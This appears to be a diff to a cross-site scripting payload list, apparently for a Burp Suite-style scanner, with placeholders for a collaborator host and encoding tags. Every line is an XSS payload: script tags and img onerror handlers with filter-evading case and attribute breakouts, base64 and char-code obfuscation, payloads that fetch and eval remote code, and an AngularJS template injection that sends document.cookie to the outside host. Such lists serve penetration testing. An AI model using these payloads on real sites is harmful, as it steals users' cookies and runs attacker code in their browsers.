@@ -1,2 +1,11 @@
 <sCRiPT>document.location='!-VARIABLE_COLLABORATOR-!/?domain='+document.domain</sCRiPT>
+<scRiPT>eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))<scRiPT>
+<scRiPT>document.location=String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain<scRiPT>
+<scRipT>fetch(String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain,{ mode: 'no-cors' }).then(r=>r.text().then(t=>eval(t)))</scRiPT>
 <img src onerror="eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))">
+"><img src onerror="eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))">
+'><img src onerror="eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))">
+${document.location=String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain}
+
+{{$on.constructor("fetch('!-VARIABLE_COLLABORATOR-!/?'+document.cookie).then(r=>r.text().then(t=>eval(t)))")()}}
+
